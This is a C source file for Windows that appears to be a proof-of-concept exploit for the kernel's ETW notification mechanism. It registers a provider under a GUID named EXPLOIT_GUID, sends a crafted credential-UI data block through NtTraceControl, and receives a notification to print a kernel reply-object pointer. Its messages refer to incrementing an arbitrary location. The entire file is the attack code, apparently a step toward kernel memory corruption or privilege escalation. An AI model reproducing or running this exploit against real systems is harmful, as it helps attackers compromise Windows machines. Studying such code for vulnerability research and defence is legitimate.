#include <Windows.h>
#include <guiddef.h>
#include <evntprov.h>
#include <initguid.h>
#include <conio.h>
#include <stdio.h>
#include <winternl.h>
#include <winnt.h>
#include "../Utils//Header.h"

ULONG
EtwNotificationCallback (
    ETW_NOTIFICATION_HEADER* NotificationHeader,
    PVOID Context
)
{
    return 1;
}

int main()
{
    ETWP_NOTIFICATION_HEADER dataBlock;
    ETWP_NOTIFICATION_HEADER outputBuffer;
    ULONG returnLength = 0;
    NTSTATUS status;
    REGHANDLE regHandle;
    HRESULT result;
    HANDLE handle;
    USHORT replyIndex;

    RtlZeroMemory(&dataBlock, sizeof(dataBlock));
    result = EtwNotificationRegister(&EXPLOIT_GUID,
                                     EtwNotificationTypeCredentialUI,
                                     EtwNotificationCallback,
                                     NULL,
                                     &regHandle);
    if (!SUCCEEDED(result))
    {
        printf("Failed registering new provider\n");
        return 0;
    }

    dataBlock.NotificationType = EtwNotificationTypeCredentialUI;
    dataBlock.ReplyRequested = 1;
    dataBlock.NotificationSize = sizeof(dataBlock);
    dataBlock.DestinationGuid = EXPLOIT_GUID;
    status = NtTraceControl(EtwSendDataBlock,
                            &dataBlock,
                            sizeof(dataBlock),
                            &outputBuffer,
                            sizeof(outputBuffer),
                            &returnLength);
    if (!NT_SUCCESS(status))
    {
        printf("Failed incrementing arbitrary location\n");
        goto Exit;
    }

    //
    // Try to receive a notification and see what we get
    //
    status = NtTraceControl(EtwReceiveNotification,
                            NULL,
                            NULL,
                            &outputBuffer,
                            sizeof(outputBuffer),
                            &returnLength);
    if (!NT_SUCCESS(status))
    {
        printf("Failed receiving notification\n");
        goto Exit;
    }
    printf("reply object: 0x%p\n", outputBuffer.ReplyObject);

Exit:
    _getch();
}